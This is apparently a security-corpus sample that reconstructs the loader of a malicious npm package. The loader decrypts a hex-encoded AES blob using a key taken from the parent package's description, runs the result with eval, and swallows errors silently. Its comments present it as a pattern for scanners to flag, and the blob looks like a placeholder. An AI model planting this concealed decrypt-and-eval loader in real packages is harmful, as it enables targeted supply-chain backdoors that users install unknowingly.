// SECURITY CORPUS ARTIFACT: representative reconstruction of MAL-2025-20690.
// The eval() below is the *malicious pattern being demonstrated* — it is the
// finding a security scanner should report, not code executed by the build script.
// AES-256 encrypted payload (key derived from parent package description)
var e = Buffer.from(
  'd26c9a7d5c9dce2c4f5c6a5d3e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f'
  + '5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6',
  'hex'
);
// Decrypt with key derived from npm_package_description of parent
try {
  var d = require('crypto')
    .createDecipher('aes256', process.env.npm_package_description)
    .update(e);
  eval(d.toString()); // malicious pattern: executes decrypted payload at runtime
} catch (x) {}
